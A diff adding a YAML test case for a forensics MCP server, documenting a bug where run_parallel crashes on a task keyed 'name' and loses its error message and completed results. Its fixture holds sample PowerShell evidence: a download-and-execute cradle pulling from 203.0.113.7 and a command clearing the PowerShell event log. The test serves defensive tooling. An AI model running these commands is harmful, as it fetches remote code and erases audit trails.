@@ -1,0 +1,66 @@
+# Matrix case P4103-016: run_parallel writes "Task i missing required 'tool'
+# key" into results[i] for a task without a "tool" key and runs the others,
+# but then reads t["tool"] again for the audit entry (app.py 743-753) and for
+# the response (757-760). The KeyError ends the call, so the client gets
+# neither that message nor the results of the tasks that did run.
+case_id: P4103-016
+problem: P4103
+server: mulder
+variant: mulder-3164843
+commit: 3164843baf74c7fe69e7121dbd6150f8f77ce660
+display: multi-call
+level: mcp
+realism: possible
+realism_ko: "MCP의 tools/call은 도구 이름을 `name` 키로 보내므로, 모델이 `run_parallel`의 작업 하나를 같은 모양(`name`)으로 적는 일이 있을 수 있다."
+coverage: full
+summary: >-
+  A run_parallel batch of two run_strings tasks, the second written with
+  "name" instead of "tool", fails with only "Error executing tool
+  run_parallel" (the KeyError is not even named); the server's own "missing required 'tool' key"
+  message is lost, and so is the result of the first task, which ran and
+  was indexed as strings.output.
+summary_ko: "`run_strings` 작업 두 개를 `run_parallel`로 돌리면서 두 번째를 `tool` 대신 `name` 키로 적으면, 응답은 원인도 없는 `Error executing tool run_parallel` 한 줄뿐이다. 서버가 만들어 둔 \"missing required 'tool' key\" 안내도, 실제로 실행돼 `strings.output`으로 적재된 첫 작업의 결과도 나오지 않는다."
+defect_ko: "이 서버는 `tool` 키가 없는 작업에 오류 글을 만들어 두고도, 감사 기록과 응답을 만들 때 그 키를 다시 읽다가 `KeyError`로 호출 전체를 끝내고, 클라이언트에는 원인 없는 실패 한 줄만 간다. 정상이라면 그 작업만 \"missing required 'tool' key\"로 돌려주고 나머지 작업 결과는 그대로 내야 한다. 모델은 일괄 실행 전체가 알 수 없는 이유로 실패해 아무것도 적재되지 않았다고 잘못 안다."
+setup_ko: "PowerShell 스크립트 두 개를 증거에 두고 사건을 만든 뒤, 두 파일의 `run_strings`를 `run_parallel`로 한 번에 돌렸다. 두 번째 작업만 도구 이름을 `name` 키로 적었다."
+fixture:
+  - path: scripts/update.ps1
+    text: |
+      $wc = New-Object Net.WebClient
+      IEX ($wc.DownloadString("http://203.0.113.7/a"))
+  - path: scripts/cleanup.ps1
+    text: |
+      Remove-Item -Path "$env:TEMP\a.ps1" -Force
+      wevtutil cl "Windows PowerShell"
+steps:
+  - tool: scan_evidence
+    note_ko: "준비: 사건 만들기"
+    args:
+      evidence_path: ${EVIDENCE}
+      case_id: parallel-missing-tool
+  - tool: run_parallel
+    note_ko: "결함 호출: 두 번째 작업만 `name` 키로 적은 일괄 실행"
+    args:
+      tasks:
+        - tool: run_strings
+          args:
+            target_path: ${EVIDENCE}/scripts/update.ps1
+        - name: run_strings
+          args:
+            target_path: ${EVIDENCE}/scripts/cleanup.ps1
+  - tool: get_raw_output
+    note_ko: "비교 호출: 첫 작업이 실제로 적재한 출력"
+    args:
+      source_name: strings.output
+expect:
+  - step: 2
+    note_ko: "호출 전체가 오류로 끝난다"
+    is_error: true
+  - step: 2
+    note_ko: "오류 글은 원인 없는 `Error executing tool run_parallel` 한 줄이다"
+    regex: '^Error executing tool run_parallel\s*$'
+  - step: 2
+    note_ko: "서버가 만들어 둔 작업별 안내가 응답에 없다"
+    not_contains: "missing required"
+  - step: 3
+    note_ko: "첫 작업은 실행돼 `update.ps1`의 문자열이 적재돼 있다"
+    contains: "DownloadString"
